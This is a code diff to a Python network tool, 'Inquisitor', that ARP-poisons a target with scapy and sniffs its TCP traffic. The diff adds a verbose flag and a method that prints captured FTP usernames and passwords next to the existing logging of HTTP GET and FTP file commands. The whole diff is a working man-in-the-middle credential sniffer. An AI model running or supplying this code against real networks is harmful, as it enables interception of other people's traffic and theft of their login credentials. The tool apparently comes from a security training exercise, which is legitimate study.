@@ -32,10 +32,21 @@ class Inquisitor:
 		self.mac_src = args.mac_src
 		self.ip_target = args.ip_target
 		self.mac_target = args.mac_target
+
+	def verbosed_mode(self, payload):
+		payload_str = payload.decode('utf-8', errors='ignore')
+		try:
+			payload_str = payload.decode('utf-8', errors='ignore')
+			if "USER" in payload_str:
+				print(f"[FTP] Username: {payload_str.strip()}")
+			elif "PASS" in payload_str:
+				print(f"[FTP] Password: {payload_str.strip()}")
+		except Exception as e:
+			error_exit(e)
 	
 	def packet_callback(self, packet):
 		#packet.show()
-		#print(packet.summary())
+		# print(packet.summary())
 		if packet.haslayer(scapy.TCP) and packet.haslayer(scapy.Raw):
 			payload = packet[scapy.Raw].load
 			if b"GET" in payload:
@@ -52,6 +63,8 @@ class Inquisitor:
 				print(f"FTP RETR Command: {payload.decode()[5:-2]}")
 			elif b"STOR" in payload:
 				print(f"FTP STOR Command: {payload.decode()[5:-2]}")
+			if verbose_mode == True:
+				self.verbosed_mode(payload)
 
 	def exit_signal(self, signum, frame):
 		arp_restore(self.ip_target, self.mac_target, self.ip_src, self.mac_src)
@@ -78,6 +91,7 @@ def parse_args() -> argparse.Namespace:
 	parser.add_argument("mac_src", type=str, help="Source Mac")
 	parser.add_argument("ip_target", type=str, help="Target IP")
 	parser.add_argument("mac_target", type=str, help="Target Mac")
+	parser.add_argument("-v", "--verbose", action="store_true", help="verbose mode")
 	args = parser.parse_args()
 	return args
 
@@ -111,9 +125,13 @@ def validate_args(args:argparse.Namespace):
 		error_exit(e)
 
 def main():
+	global verbose_mode
+	verbose_mode = False
 	try:
 		args = parse_args()
 		validate_args(args)
+		if args.verbose:
+			verbose_mode = True
 		inquisitor = Inquisitor(args)
 		inquisitor.poison()
 	except Exception as e:
